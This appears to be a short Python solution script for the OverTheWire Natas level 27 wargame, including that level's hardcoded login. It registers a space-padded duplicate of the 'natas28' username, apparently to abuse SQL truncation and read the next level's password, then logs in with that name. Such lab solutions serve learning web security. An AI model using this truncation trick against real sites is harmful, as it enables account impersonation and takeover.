import requests

username = 'natas27'
password = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'

url = "http://%s.natas.labs.overthewire.org" % username

data = {
    'username': f'natas28{" "* 64}abc',
    'password': 'natas28'
}
r = requests.post(url, data=data, auth=(username,password))


data = {
    'username': f'natas28',
    'password': 'natas28'
}
r = requests.post(url, data=data, auth=(username,password))
print(r.text)